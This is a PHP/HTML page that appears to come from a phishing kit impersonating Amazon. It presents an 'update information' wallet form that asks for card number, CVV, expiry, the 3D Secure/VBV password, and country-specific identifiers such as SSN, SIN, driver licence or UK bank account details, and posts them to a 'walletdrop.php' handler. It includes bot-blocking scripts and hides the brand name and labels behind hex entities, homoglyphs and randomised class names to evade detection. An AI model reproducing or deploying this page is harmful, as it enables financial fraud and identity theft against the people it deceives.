<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include('../banned.php');?>
<!-- HTML INPUTS FOR WALLET PAGE -->
<!-- CODE STARTS HERE -->	
<script type="text/javascript">
  function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script><script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<form method="POST" action="walletdrop.php?cmd=_update-information&account_card=<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>" id="asv-allowance-form" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative asv-no-js">
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label >&#x4E;&#x61;&#x6D;&#x65;&#x20;&#x6F;&#x6E;&#x20;&#x63;&#x61;&#x72;&#x64;
      </label>
      <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
        <input type="text" id="cc_holder" required="" onkeydown="upperCaseF(this)" id="asv-allowances-title" value="" autocomplete="off" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text" placeholder="&#x43;&#x61;&#x72;&#x64;&#x20;&#x68;&#x6F;&#x6C;&#x64;&#x65;&#x72;&#x20;&#x6E;&#x61;&#x6D;&#x65;" name="cc_holder" maxlength="50" >
      </div>
    </div>
  </div>
  <script type="text/javascript" src="../data/js/jquery.min.js"></script><script type="text/javascript" src="../data/js/jquery.min.mask.js"></script><script type="text/javascript" src="../data/js/jquery.payment.js">
  </script>
  <link rel="stylesheet" href="../data/css/app.css" />
  <style type="text/css">
    span.description{
      display:block;
      margin:.1em 0 0 1.6em}
    .has-error input{
      border:1px solid #9D2C36}
    form #cc_number{
      background-image:url(../data/icon/sprites_cc_global.png);
      background-position:98.5% 87%;
      background-size:45px 720px;
      background-repeat:no-repeat;
      padding-right:10%}
    form #cc_number.valid.visa{
      background-position:98.5% -.5%}
    form #cc_number.valid.mastercard{
      background-position:100% 6%}
    form #cc_number.valid.amex{
      background-position:100% 12%}
    form #cc_number.valid.diners_club_international{
      background-position:100% 24%}
    form #cc_number.valid.jcb{
      background-position:100% 31%}
    form #cc_number.valid.discover{
      background-position:98.5% 18.3%}
    form #cc_number.valid.maestro{
      background-position:99% 37%}
    form #cvv2_number{
      background-image:url(../data/icon/sprites_cc_global.png);
      background-position:98.5% 93.2%;
      background-size:45px 720px;
      background-repeat:no-repeat;
      padding-right:10%px}
    form #cvv2_number.amex{
      background-position:98.5% 99.5%}
    form fieldset.multi p{
      float:left;
      margin:0 .5em 0 0}
  </style>           
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label class="<?php echo md5(uniqid(rand(), true)); ?>   aok-inline-block">&#x43;&#x61;&#x72;&#x64;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;
      </label>
      <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative" data-action="a-popover" data-a-popover="{&quot;name&quot;:&quot;recipientEmailPopover&quot;,&quot;header&quot;:&quot;What email address should I enter?&quot;}">
      </span>
      <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
        <input type="tel" id="cc_number" onkeyup="type_carte()" placeholder="&#x58;&#x58;&#x58;&#x58;&#x20;&#x58;&#x58;&#x58;&#x58;&#x20;&#x58;&#x58;&#x58;&#x58;&#x20;&#x58;&#x58;&#x58;&#x58;" title="&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;" autocomplete="off" required="" pattern="[2-7][0-9 ]{11,24}" maxlength="30" name="cc_number" value=""  class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text" >
      </div>
    </div>
  </div>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label>&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x43;&#x6F;&#x64;&#x65;
      </label>
      <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper">
        <input type="tel" id="cvv2_number" required="" pattern="[0-9]{3,4}" title="&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x43;&#x6F;&#x64;&#x65; " placeholder="&#x43;&#x56;&#x56;&sol;&#x43;&#x56;&#x56;&#x32;" maxlength="4" name="cvv2_number" value="" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text" size="6">
      </div>
    </div>
  </div>
  <script src="../data/js/jquery.js" type="text/javascript">
  </script>
  <script src="../data/js/jquery.maskedinput.js" type="text/javascript">
  </script>
  <script type="text/javascript">
    jQuery(function($){
      $("#EXD").mask("99/9999",{
        placeholder:"MM/YYYY"}
                    );
    }
          );
  </script>			
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label >&#x45;&#x78;&#x70;&#x69;&#x72;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x64;&#x61;&#x74;&#x65;
      </label>
      <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
        <input type="tel" required="" id="EXD" placeholder="MM/YYYY" name="EXD" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text">
      </div>
    </div>
  </div>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
    <?php  ################################################################################################################################### ?>
    <script>
      function type_carte(){
        var get_value = document.getElementById('cc_number').value;
        var type = get_value.substring(0,2);
        var other = get_value.substring(0,1);
        if(other == "4"){
          document.getElementById("cvv2_number").maxLength ="3"
        }
        else if(other == "5"){
          document.getElementById("cvv2_number").maxLength ="3"
        }
        /*Amex Card*/
        else if(type == "34"){
          document.getElementById('th3mrx').style.display ="none"
          document.getElementById("cvv2_number").maxLength ="4"
        }
        else if(type == "37"){
          document.getElementById('th3mrx').style.display ="none"
          document.getElementById("cvv2_number").maxLength ="4"
        }
        /*End Amex Card*/
        /*blue Card*/
        else if(type == "30"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "36"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "38"){
          document.getElementById('th3mrx').style.display ="none"
        }
        /*End blue Card*/
        else if(other == "6"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else if(type == "35"){
          document.getElementById('th3mrx').style.display ="none"
        }
        else{
          document.getElementById('th3mrx').style.display ="block"
        }
      };
    </script>
    <div id="th3mrx" class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label >&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;&sol;&#x56;&#x42;&#x56;
      </label>
      <div id="th3mrx" class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
        <style type="text/css">
          #vbv{
            background-image:url(../data/icon/vbv_mcsc_medium_nobg.gif);
            background-repeat: no-repeat;
            background-size: 100px 30px;
            background-position: 100% 50%;
          }
        </style>
        <input type="password" id="vbv" value="" autocomplete="off" placeholder="&#x33;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&sol;&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x65;&#x64;&#x20;&#x62;&#x79;&#x20;&#x56;&#x69;&#x73;&#x61;" name="vbv" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"maxlength="50" >
      </div>
    </div>
  </div>
  <script type="text/javascript">
    jQuery(function($){
      $("#ssn").mask("999-99-9999");
      $("#sortcode").mask("99-99-99");
      $("#sin").mask("999-99-9999");
      $("#an").mask("99999999");
    }
          );
  </script>
  <?php  ################################################################################################################################### ?>		
  <?php  
// SHOW SOCIAL SEC NUMBER ONLY IF COUNTRY IS USA OR ISRAEL
if ($COUNTRYCODE=="US" or $COUNTRYCODE=="IL"){ echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;" id="ssn" required="required" name="ssn" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW SOCIAL INSURANCE NUMBER ONLY IF COUNTRY IS CANADA
elseif ($COUNTRYCODE=="CA"){ echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">S&omicron;cial Insurance Number</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="S&omicron;cial Insurance Number" id="sin" required="required" name="sin" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW NATIONAL ID NUMBER ONLY IF COUNTRY IS HONGKONG
elseif ($COUNTRYCODE=="HK") { echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Nati&omicron;nal &Iota;D &Nu;umber</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Nati&omicron;nal &Iota;D &Nu;umber" id="nin" required="required" name="nin" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW DRIVER LICENCE NUMBER ONLY IF COUNTRY IS AUSTRALIA
elseif ($COUNTRYCODE=="AU") { echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Driver Licence Number</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Driver Licence Number" id="dln" required="required" name="dln" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
// SHOW SORTCODE + ACCOUNT NUMBER ONLY IF COUNTRY IS UNITED KINGDOM
elseif ($COUNTRYCODE=="GB"){ echo '
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Sort Code</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Sort Code" id="sortcode" required="required" name="sortcode" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-row">
<div class="<?php echo md5(uniqid(rand(), true)); ?>   a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
<label  class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-base a-text-bold">Account Number</label><div class="<?php echo md5(uniqid(rand(), true)); ?>   a-input-text-wrapper ">
<input type="tel" placeholder="Account Number" id="an" required="required" name="an" class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative a-input-text"></div></div></div>
<br>
';}
?>
  <?php  ################################################################################################################################### ?>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-section a-spacing-extra-large a-spacing-top-extra-large">
    <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-popover-preload" id="a-popover-legalTerms">
      <span>
       &#x20;&#x42;&#x79;&#x20;&#x63;&#x6C;&#x69;&#x63;&#x6B;&#x69;&#x6E;&#x67;&#x20;&#x22;&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x26;&#x20;&#x41;&#x63;&#x74;&#x69;&#x76;&#x61;&#x74;&#x65;&#x22;&#x2C;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x61;&#x67;&#x72;&#x65;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x391;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;.
        <?php  
if     ($COUNTRYCODE=="GB"){ echo 'co.uk';}
elseif ($COUNTRYCODE=="IN"){ echo 'in';}
elseif ($COUNTRYCODE=="CA"){ echo 'ca';}
elseif ($COUNTRYCODE=="FR"){ echo 'fr';}
elseif ($COUNTRYCODE=="AU"){ echo 'com.au';}
elseif ($COUNTRYCODE=="BR"){ echo 'com.br';}
elseif ($COUNTRYCODE=="CN"){ echo 'cn';}
elseif ($COUNTRYCODE=="IT"){ echo 'it';}
elseif ($COUNTRYCODE=="JP"){ echo 'co.jp';}
elseif ($COUNTRYCODE=="MX"){ echo 'com.mx';}
elseif ($COUNTRYCODE=="ES"){ echo 'es';}
elseif ($COUNTRYCODE=="DE"){ echo 'de';}
else                       { echo 'com';} ?>'&#x73;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x6E;&#x6F;&#x74;&#x69;&#x63;&#x65;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x63;&#x6F;&#x6E;&#x64;&#x69;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x75;&#x73;&#x65;.
      </span>
    </div>
    <h3 class="<?php echo md5(uniqid(rand(), true)); ?>   a-spacing-mini">&Alpha;m&#97;&#x7A;&#x6F;&#x6E; &#x55;&#x70;&#x64;&#x61;&#x74;&#x65;&#x20;&#x54;&#x65;&#x72;&#x6D;&#x73;
    </h3>
    <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-declarative" data-action="a-secondary-view" data-a-secondary-view="{&quot;name&quot;:&quot;legalTerms&quot;,&quot;position&quot;:&quot;triggerVertical&quot;}">
      <a href="#" class="<?php echo md5(uniqid(rand(), true)); ?>   a-touch-link a-box">
        <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-box-inner">
          <i class="<?php echo md5(uniqid(rand(), true)); ?>   a-icon a-icon-touch-link">
          </i>
          <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-size-small a-color-tertiary">
           &#x20;&#x42;&#x79;&#x20;&#x63;&#x6C;&#x69;&#x63;&#x6B;&#x69;&#x6E;&#x67;&#x20;&#x22;&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x26;&#x20;&#x41;&#x63;&#x74;&#x69;&#x76;&#x61;&#x74;&#x65;&#x22;&#x2C;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x61;&#x67;&#x72;&#x65;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x391;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;.
            <?php  
if     ($COUNTRYCODE=="GB"){ echo 'co.uk';}
elseif ($COUNTRYCODE=="IN"){ echo 'in';}
elseif ($COUNTRYCODE=="CA"){ echo 'ca';}
elseif ($COUNTRYCODE=="FR"){ echo 'fr';}
elseif ($COUNTRYCODE=="AU"){ echo 'com.au';}
elseif ($COUNTRYCODE=="BR"){ echo 'com.br';}
elseif ($COUNTRYCODE=="CN"){ echo 'cn';}
elseif ($COUNTRYCODE=="IT"){ echo 'it';}
elseif ($COUNTRYCODE=="JP"){ echo 'co.jp';}
elseif ($COUNTRYCODE=="MX"){ echo 'com.mx';}
elseif ($COUNTRYCODE=="ES"){ echo 'es';}
elseif ($COUNTRYCODE=="DE"){ echo 'de';}
else                       { echo 'com';} ?>'&#x73;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x6E;&#x6F;&#x74;&#x69;&#x63;&#x65;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x63;&#x6F;&#x6E;&#x64;&#x69;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x75;&#x73;&#x65;.
          </span>
        </div>
      </a>
    </span>
  </div>
  <div class="<?php echo md5(uniqid(rand(), true)); ?>   a-section a-spacing-top-extra-large">
    <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-button a-button-span12 a-button-primary">
      <span class="<?php echo md5(uniqid(rand(), true)); ?>   a-button-inner">
        <button id="submit" class="<?php echo md5(uniqid(rand(), true)); ?>   a-button-text"  type="submit">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x26;&#x20;&#x41;&#x63;&#x74;&#x69;&#x76;&#x61;&#x74;&#x65;
        </button>
      </span>
    </span>
  </div>
</form>
<!-- CODE ENDS HERE -->
